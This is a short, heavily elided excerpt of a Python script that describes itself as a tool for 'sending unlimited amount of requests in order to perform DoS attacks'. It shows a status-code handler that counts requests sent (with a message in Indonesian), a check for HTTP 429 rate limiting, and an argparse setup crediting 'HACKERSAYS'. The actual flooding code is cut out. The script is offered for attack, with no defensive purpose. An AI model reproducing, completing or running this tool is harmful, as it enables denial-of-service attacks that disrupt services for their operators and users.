...
def handleStatusCodes(status_code):
	...
	sys.stdout.write("\r%i permintaan tlah di kirim" % request_counter)
	sys.stdout.flush()
	if status_code == 429:
...
def main(argv):
	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by HACKERSAYS')
